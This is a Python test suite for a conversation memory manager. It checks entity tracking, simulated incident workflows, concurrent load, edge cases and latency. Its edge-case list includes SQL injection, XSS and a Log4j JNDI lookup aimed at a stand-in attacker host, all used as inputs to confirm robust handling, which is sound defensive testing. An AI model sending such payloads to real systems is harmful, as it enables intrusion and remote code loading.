#!/usr/bin/env python3
"""
Comprehensive test suite for conversation memory system with real LLM integration
Testing: Multi-turn coherence, entity resolution, stress/load, error handling, and edge cases.
"""
import asyncio
import random
import time
import json
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
import sys
sys.path.append('/opt/tower-echo-brain')

from src.managers.conversation_memory_manager import get_conversation_memory_manager

class ComprehensiveMemoryTester:
    def __init__(self):
        self.test_results = {}
        self.memory_manager = None

    async def setup(self):
        """Initialize the memory manager"""
        self.memory_manager = await get_conversation_memory_manager()

    async def test_multi_turn_coherence(self):
        """Test entity tracking across complex conversations"""
        print("\n🧪 Test 1: Multi-turn Coherence")

        test_cases = [
            {
                "name": "Service troubleshooting chain",
                "conversation_id": "test_coherence_1",
                "turns": [
                    ("The anime service on port 8309 is crashing with OOM errors", "user", "incident_report"),
                    ("Check memory usage and restart with --max-old-space-size=4096", "assistant", "troubleshooting"),
                    ("Now restart it in production mode", "user", "action_request"),
                    ("What about the authentication service on port 3000?", "user", "system_query"),
                    ("Both are having connection pool exhaustion", "assistant", "analysis"),
                    ("Fix them with the same configuration", "user", "action_request"),
                ]
            },
            {
                "name": "Complex project planning",
                "conversation_id": "test_coherence_2",
                "turns": [
                    ("Let's discuss Project Quantum timeline for anime production", "user", "planning"),
                    ("We need to allocate 3 developers and 2 QA engineers for the team", "assistant", "resource_planning"),
                    ("Budget is $150k for Q3", "user", "budget_planning"),
                    ("What about the infrastructure costs for AWS and ComfyUI?", "assistant", "infrastructure_planning"),
                    ("Include RDS instance and 2 EC2 nodes for the deployment", "user", "technical_specification"),
                    ("Update the timeline to include comprehensive testing phase", "assistant", "project_management"),
                ]
            }
        ]

        results = []
        for test in test_cases:
            print(f"\n  📋 Testing: {test['name']}")
            conv_id = test['conversation_id']

            turn_results = []
            for i, (content, role, intent) in enumerate(test['turns']):
                turn = await self.memory_manager.add_turn(conv_id, role, content, intent)

                # Test reference resolution on turns with pronouns
                if " it" in content.lower() or " them" in content.lower() or " they" in content.lower():
                    enhanced, resolved_entities = await self.memory_manager.resolve_reference(content, conv_id)
                    resolution_success = len(resolved_entities) > 0
                    print(f"    Turn {i+1}: '{content}' → Resolved {len(resolved_entities)} entities")
                else:
                    resolution_success = None

                turn_results.append({
                    "turn": i+1,
                    "entities_extracted": len(turn.entities),
                    "resolution_success": resolution_success
                })

            # Validate session state
            session = self.memory_manager.active_sessions.get(conv_id)
            session_entities = len(session.active_entities) if session else 0

            print(f"    ✅ Final entities tracked: {session_entities}")

            # Test session summary
            summary = await self.memory_manager.get_session_summary(conv_id)
            has_summary = len(summary.strip()) > 50

            print(f"    ✅ Summary generated: {has_summary} ({len(summary)} chars)")

            results.append({
                "test": test['name'],
                "turns_processed": len(test['turns']),
                "entities_tracked": session_entities,
                "has_summary": has_summary,
                "turn_details": turn_results,
                "success": session_entities >= 3 and has_summary
            })

        return results

    async def test_real_workflow_scenarios(self):
        """Simulate actual Tower administrator workflows"""
        print("\n🧪 Test 2: Real-World Workflow Scenarios")

        scenarios = [
            {
                "name": "Critical incident response",
                "steps": [
                    ("URGENT: anime-production service is completely down on port 8328", "user", "critical_incident"),
                    ("Checking service logs and system metrics. Last healthy status 15 minutes ago.", "assistant", "investigation"),
                    ("Found OOM error in container logs. Memory usage spiked to 95% before crash", "assistant", "root_cause_analysis"),
                    ("Restart it with 8GB memory limit immediately", "user", "emergency_action"),
                    ("Restarted anime-production with 8GB memory limit. Service is now healthy", "assistant", "action_confirmation"),
                    ("Now check the authentication service too - users can't login", "user", "related_issue"),
                    ("Auth service shows high latency but is responding. No critical errors", "assistant", "secondary_analysis"),
                    ("Apply the same memory optimization to both services", "user", "preventive_action"),
                ]
            },
            {
                "name": "Deployment and rollback workflow",
                "steps": [
                    ("Deploying tower-anime-production v2.5.0 to production cluster", "user", "deployment"),
                    ("Deployment initiated. Kubernetes updating 10 pods in rolling update", "assistant", "deployment_status"),
                    ("Pod 3/10 failed with image pull error from registry", "assistant", "deployment_issue"),
                    ("Check the container registry credentials and authentication", "user", "troubleshooting"),
                    ("Registry auth expired. Refreshed credentials, retrying pod 3", "assistant", "issue_resolution"),
                    ("Rollback the entire deployment to v2.4.1", "user", "rollback_decision"),
                    ("Initiating rollback to v2.4.1. All pods rolling back", "assistant", "rollback_execution"),
                    ("Check database migration status for schema compatibility", "user", "data_validation"),
                    ("Database migration rolled back successfully. Schema at v2.4.1", "assistant", "data_confirmation"),
                ]
            }
        ]

        results = []
        for i, scenario in enumerate(scenarios):
            print(f"\n  📋 Scenario: {scenario['name']}")
            conv_id = f"scenario_{i}_{int(time.time())}"

            reference_resolutions = []
            entity_growth = []

            for step_num, (content, role, intent) in enumerate(scenario['steps']):
                turn = await self.memory_manager.add_turn(conv_id, role, content, intent)

                # Track entity accumulation
                session = self.memory_manager.active_sessions.get(conv_id)
                current_entities = len(session.active_entities) if session else 0
                entity_growth.append(current_entities)

                # Test pronoun resolution
                pronouns = ["it", "them", "they", "that", "those", "the service", "the deployment"]
                for pronoun in pronouns:
                    if f" {pronoun}" in content.lower() or content.lower().startswith(pronoun):
                        enhanced, resolved = await self.memory_manager.resolve_reference(content, conv_id)
                        if len(resolved) > 0:
                            reference_resolutions.append({
                                "step": step_num,
                                "pronoun": pronoun,
                                "resolved_count": len(resolved)
                            })
                            break

                # Small realistic delay
                await asyncio.sleep(0.05)

            # Generate and validate summary
            summary = await self.memory_manager.get_session_summary(conv_id)

            print(f"    ✅ Steps completed: {len(scenario['steps'])}")
            print(f"    ✅ Reference resolutions: {len(reference_resolutions)}")
            print(f"    ✅ Entity growth: {entity_growth[0]} → {entity_growth[-1]}")
            print(f"    ✅ Summary: {len(summary)} chars")

            results.append({
                "scenario": scenario['name'],
                "steps_completed": len(scenario['steps']),
                "reference_resolutions": len(reference_resolutions),
                "entity_growth": entity_growth,
                "summary_length": len(summary),
                "success": len(reference_resolutions) > 0 and entity_growth[-1] > entity_growth[0]
            })

        return results

    async def test_stress_concurrent_sessions(self):
        """Test system under high load with many concurrent sessions"""
        print("\n🧪 Test 3: Stress Testing - Concurrent Sessions")

        num_sessions = 25  # Reduced for testing environment
        turns_per_session = 8
        concurrent_limit = 10

        print(f"  Creating {num_sessions} sessions with {turns_per_session} turns each...")
        print(f"  Concurrent limit: {concurrent_limit}")

        # Generate realistic test data
        services = [f"tower-{svc}" for svc in ["anime-production", "auth", "kb", "apple-music", "crypto-trader"]]
        errors = ["OOM", "Connection timeout", "Auth failure", "Disk space", "Network error"]
        ports = [8309, 8328, 8088, 8307, 8315, 3000, 5432, 6379]

        start_time = time.time()

        async def simulate_session(session_id):
            """Simulate one realistic conversation session"""
            session_results = []
            conv_id = f"stress_{session_id}"

            try:
                for turn in range(turns_per_session):
                    service = random.choice(services)
                    error = random.choice(errors)
                    port = random.choice(ports)

                    if turn % 4 == 0:
                        # Initial problem report
                        content = f"Service {service} on port {port} is experiencing {error}"
                        role = "user"
                        intent = "incident_report"
                    elif turn % 4 == 1:
                        # Assistant analysis
                        content = f"Investigating {service}. Found correlation with {error} in system logs"
                        role = "assistant"
                        intent = "analysis"
                    elif turn % 4 == 2:
                        # User follow-up with pronoun
                        content = "Fix it with emergency restart procedure"
                        role = "user"
                        intent = "action_request"
                    else:
                        # Assistant confirmation
                        content = f"Applied fix to {service}. Monitoring for stability"
                        role = "assistant"
                        intent = "action_confirmation"

                    turn_result = await self.memory_manager.add_turn(conv_id, role, content, intent)

                    session_results.append({
                        "turn": turn,
                        "entities": len(turn_result.entities),
                        "success": True
                    })

                    # Small delay to simulate realistic usage
                    await asyncio.sleep(0.01)

                return {"session_id": session_id, "results": session_results, "success": True}

            except Exception as e:
                return {"session_id": session_id, "error": str(e), "success": False}

        # Run concurrent sessions with semaphore
        semaphore = asyncio.Semaphore(concurrent_limit)

        async def bounded_session(session_id):
            async with semaphore:
                return await simulate_session(session_id)

        tasks = [bounded_session(i) for i in range(num_sessions)]
        all_results = await asyncio.gather(*tasks, return_exceptions=True)

        end_time = time.time()
        duration = end_time - start_time

        # Calculate metrics
        successful_sessions = sum(1 for r in all_results if isinstance(r, dict) and r.get("success"))
        total_turns = num_sessions * turns_per_session
        successful_turns = sum(
            len(r["results"]) for r in all_results
            if isinstance(r, dict) and r.get("success") and "results" in r
        )

        success_rate = successful_sessions / num_sessions
        throughput = total_turns / duration if duration > 0 else 0

        print(f"  ✅ Stress test completed in {duration:.2f}s")
        print(f"  📊 Successful sessions: {successful_sessions}/{num_sessions}")
        print(f"  📊 Success rate: {success_rate:.1%}")
        print(f"  📊 Throughput: {throughput:.1f} turns/second")

        # Memory usage check
        active_sessions = len(self.memory_manager.active_sessions)
        global_entities = len(self.memory_manager.global_entities)
        print(f"  🧠 Active sessions: {active_sessions}")
        print(f"  🧠 Global entities: {global_entities}")

        return {
            "duration": duration,
            "num_sessions": num_sessions,
            "success_rate": success_rate,
            "throughput": throughput,
            "active_sessions": active_sessions,
            "global_entities": global_entities,
            "success": success_rate > 0.8  # 80% success threshold
        }

    async def test_edge_cases_and_outliers(self):
        """Test unusual scenarios and error conditions"""
        print("\n🧪 Test 4: Edge Cases & Outliers")

        edge_cases = [
            # Empty and whitespace
            ("", "Empty input"),
            ("   ", "Whitespace only"),
            ("\n\n\t\r\n", "Control characters"),

            # Length extremes
            ("A" * 1000, "Very long input"),
            ("short", "Very short input"),
            ("word " * 500, "Repetitive content"),

            # Unicode and special characters
            ("Service café-prod需要重启现在🚀", "Mixed Unicode"),
            ("Service 🔥 needs 🛠️ fixing 🔧 immediately", "Emoji heavy"),
            ("Service\x00null\x00byte", "Null bytes"),

            # Potential injection attempts
            ("'; DROP TABLE conversations; --", "SQL injection attempt"),
            ("<script>alert('xss')</script>", "XSS attempt"),
            ("${jndi:ldap://attacker.com/}", "Log4j injection"),

            # Malformed input
            ('{"service": "broken json}', "Malformed JSON"),
            ("\\u0000\\u001f\\u007f", "Escaped control chars"),
            ("SELECT * FROM WHERE DELETE", "SQL keywords"),

            # Self-referential and ambiguous
            ("This thing refers to itself", "Self-reference"),
            ("What does 'that' mean?", "Undefined reference"),
            ("Fix the thing we discussed yesterday", "Temporal reference"),

            # Technical content
            ("curl -X POST http://localhost:8080/api", "Code snippet"),
            ("Error: NullPointerException at line 42", "Stack trace"),
            ("Base64: SGVsbG8gV29ybGQ=", "Encoded content"),
        ]

        results = []
        for i, (content, description) in enumerate(edge_cases):
            conv_id = f"edge_case_{i}"

            try:
                # Test entity extraction
                turn = await self.memory_manager.add_turn(conv_id, "user", content, "edge_case_test")

                # Test reference resolution if applicable
                if content.strip():
                    enhanced, resolved = await self.memory_manager.resolve_reference(content, conv_id)
                else:
                    enhanced, resolved = "", []

                # Evaluate results
                if not content.strip():
                    # Empty content should extract minimal entities
                    status = "✅ Handled gracefully" if len(turn.entities) <= 1 else "⚠️ Unexpected entities"
                elif len(content) > 500:
                    # Long content should be processed without crashing
                    status = "✅ Handled large input" if len(turn.entities) > 0 else "⚠️ No entities from large input"
                else:
                    # Normal content should extract some entities
                    status = "✅ Processed normally"

                print(f"  {description}: {status}")

                results.append({
                    "case": description,
                    "input_length": len(content),
                    "entities_extracted": len(turn.entities),
                    "reference_resolved": len(resolved),
                    "status": "passed"
                })

            except Exception as e:
                error_msg = str(e)[:100]
                print(f"  {description}: ❌ {error_msg}")

                results.append({
                    "case": description,
                    "error": error_msg,
                    "status": "failed"
                })

            await asyncio.sleep(0.02)

        passed = sum(1 for r in results if r["status"] == "passed")
        total = len(results)

        print(f"\n  📊 Edge cases passed: {passed}/{total} ({passed/total*100:.1f}%)")

        return results

    async def test_performance_benchmarks(self):
        """Measure performance of key operations"""
        print("\n🧪 Test 5: Performance Benchmarks")

        # Test phrases of varying complexity
        test_phrases = [
            "Simple service restart",
            "The anime-production service on port 8328 is experiencing memory issues",
            "Deploy the latest authentication service with the new OAuth2 implementation and SSL certificates",
            "Monitor the Kubernetes cluster for pod restarts, memory leaks, and network failures across all namespaces",
            "Review the API gateway access logs for HTTP 5xx errors, latency spikes, and security incidents from the past 24 hours",
        ]

        benchmarks = {}

        # 1. Entity extraction performance
        print("  📊 Benchmarking entity extraction...")
        extraction_times = []

        for i, phrase in enumerate(test_phrases):
            times = []
            for _ in range(3):  # Run multiple times for accuracy
                start = time.perf_counter()
                turn = await self.memory_manager.add_turn(f"bench_extract_{i}", "user", phrase, "benchmark")
                end = time.perf_counter()
                times.append((end - start) * 1000)  # Convert to ms

            avg_time = sum(times) / len(times)
            extraction_times.append(avg_time)
            print(f"    Phrase {i+1} ({len(phrase)} chars): {avg_time:.2f}ms")

        benchmarks["entity_extraction_ms"] = sum(extraction_times) / len(extraction_times)

        # 2. Reference resolution performance
        print("  📊 Benchmarking reference resolution...")
        resolution_times = []

        # Set up a conversation with entities
        conv_id = "benchmark_resolution"
        await self.memory_manager.add_turn(conv_id, "user", "The anime service and auth service are both failing", "setup")

        test_references = ["restart it", "fix them", "check that service", "update those systems", "restart both"]

        for ref in test_references:
            times = []
            for _ in range(3):
                start = time.perf_counter()
                enhanced, resolved = await self.memory_manager.resolve_reference(ref, conv_id)
                end = time.perf_counter()
                times.append((end - start) * 1000)

            avg_time = sum(times) / len(times)
            resolution_times.append(avg_time)

        benchmarks["reference_resolution_ms"] = sum(resolution_times) / len(resolution_times)

        # 3. Session summary performance
        print("  📊 Benchmarking session summaries...")
        summary_times = []

        for i in range(3):
            start = time.perf_counter()
            summary = await self.memory_manager.get_session_summary(conv_id)
            end = time.perf_counter()
            summary_times.append((end - start) * 1000)

        benchmarks["session_summary_ms"] = sum(summary_times) / len(summary_times)

        # Report results
        print(f"  ✅ Entity extraction: {benchmarks['entity_extraction_ms']:.2f}ms average")
        print(f"  ✅ Reference resolution: {benchmarks['reference_resolution_ms']:.2f}ms average")
        print(f"  ✅ Session summary: {benchmarks['session_summary_ms']:.2f}ms average")

        # Performance thresholds
        benchmarks["performance_grade"] = "A" if all([
            benchmarks["entity_extraction_ms"] < 2000,  # 2 seconds for LLM extraction
            benchmarks["reference_resolution_ms"] < 100,  # 100ms for resolution
            benchmarks["session_summary_ms"] < 3000,  # 3 seconds for LLM summary
        ]) else "B" if all([
            benchmarks["entity_extraction_ms"] < 5000,
            benchmarks["reference_resolution_ms"] < 500,
            benchmarks["session_summary_ms"] < 10000,
        ]) else "C"

        print(f"  🎯 Performance grade: {benchmarks['performance_grade']}")

        return benchmarks

    async def run_all_tests(self):
        """Execute complete test suite"""
        print("=" * 70)
        print("🧠 COMPREHENSIVE CONVERSATION MEMORY TEST SUITE")
        print("=" * 70)
        print(f"Start time: {datetime.now().isoformat()}")

        await self.setup()

        final_report = {
            "timestamp": datetime.now().isoformat(),
            "tests": {},
            "summary": {}
        }

        test_functions = [
            ("multi_turn_coherence", self.test_multi_turn_coherence),
            ("real_world_scenarios", self.test_real_workflow_scenarios),
            ("stress_testing", self.test_stress_concurrent_sessions),
            ("edge_cases", self.test_edge_cases_and_outliers),
            ("performance_benchmarks", self.test_performance_benchmarks),
        ]

        total_tests = 0
        passed_tests = 0

        for test_name, test_function in test_functions:
            try:
                print(f"\n🔄 Running {test_name.replace('_', ' ').title()}...")
                start_time = time.time()

                results = await test_function()

                duration = time.time() - start_time
                final_report["tests"][test_name] = {
                    "results": results,
                    "duration_seconds": duration,
                    "status": "completed"
                }

                # Calculate pass/fail for this test category
                if isinstance(results, list):
                    category_passed = sum(1 for r in results if r.get("success", True))
                    category_total = len(results)
                    total_tests += category_total
                    passed_tests += category_passed
                    print(f"  ✅ {test_name}: {category_passed}/{category_total} passed ({duration:.1f}s)")
                elif isinstance(results, dict):
                    if results.get("success", True):
                        passed_tests += 1
                        status_icon = "✅"
                    else:
                        status_icon = "⚠️"
                    total_tests += 1
                    print(f"  {status_icon} {test_name}: {results.get('success_rate', 'N/A')} ({duration:.1f}s)")

            except Exception as e:
                print(f"  ❌ {test_name} FAILED: {str(e)[:100]}")
                final_report["tests"][test_name] = {
                    "error": str(e),
                    "status": "failed"
                }
                total_tests += 1

        # Generate summary
        final_report["summary"] = {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": total_tests - passed_tests,
            "pass_rate": (passed_tests / total_tests) if total_tests > 0 else 0,
            "active_sessions": len(self.memory_manager.active_sessions),
            "global_entities": len(self.memory_manager.global_entities),
        }

        # Save detailed report
        report_file = Path("/opt/tower-echo-brain/data/comprehensive_test_report.json")
        report_file.parent.mkdir(exist_ok=True)

        with open(report_file, 'w') as f:
            json.dump(final_report, f, indent=2, default=str)

        # Print final summary
        print("\n" + "=" * 70)
        print("📊 COMPREHENSIVE TEST SUITE SUMMARY")
        print("=" * 70)

        summary = final_report["summary"]
        print(f"  🎯 Total Tests: {summary['total_tests']}")
        print(f"  ✅ Passed: {summary['passed_tests']}")
        print(f"  ❌ Failed: {summary['failed_tests']}")
        print(f"  📈 Pass Rate: {summary['pass_rate']:.1%}")
        print(f"  🧠 Memory Usage: {summary['active_sessions']} sessions, {summary['global_entities']} entities")
        print(f"  📄 Report: {report_file}")

        if summary['pass_rate'] >= 0.8:
            print(f"\n🎉 CONVERSATION MEMORY SYSTEM: PRODUCTION READY!")
        else:
            print(f"\n⚠️ CONVERSATION MEMORY SYSTEM: NEEDS IMPROVEMENT")

        return final_report

async def main():
    """Main test execution"""
    tester = ComprehensiveMemoryTester()
    return await tester.run_all_tests()

if __name__ == "__main__":
    result = asyncio.run(main())